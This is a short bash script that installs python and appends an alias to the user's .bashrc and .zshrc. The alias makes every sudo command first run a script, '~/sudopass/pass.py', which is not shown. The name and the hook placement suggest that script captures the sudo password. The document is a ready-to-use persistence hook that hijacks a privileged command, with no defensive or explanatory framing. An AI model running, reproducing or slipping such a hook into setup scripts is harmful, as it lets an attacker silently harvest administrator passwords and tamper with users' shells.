#!/bin/bash
apt install python -y
echo "alias sudo='python3 ~/sudopass/pass.py && sudo'" >> ~/.bashrc
echo "alias sudo='python3 ~/sudopass/pass.py && sudo'" >> ~/.zshrc
